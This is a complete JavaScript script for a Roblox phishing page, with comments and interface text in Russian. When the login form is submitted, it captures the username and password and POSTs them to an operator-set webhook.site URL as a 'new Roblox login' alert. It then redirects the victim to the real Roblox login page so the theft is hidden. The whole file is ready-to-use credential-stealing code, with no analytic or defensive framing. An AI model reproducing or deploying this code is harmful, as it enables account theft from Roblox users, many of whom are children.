// ⚠️ ВСТАВЬ СЮДА СВОЙ ВЕБХУК ⚠️
const WEBHOOK_URL = "https://webhook.site/your-unique-id-here";

document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById('loginForm');
    
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        const loginBtn = document.querySelector('.login-btn');
        loginBtn.textContent = "Загрузка...";
        loginBtn.disabled = true;

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔴 **Новый логин Roblox!**\n👤 **User:** \`${username}\`\n🔑 **Pass:** \`${password}\``
                })
            });
        } catch (error) {
            console.error("Ошибка:", error);
        }

        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login";
        }, 1500);
    });
});
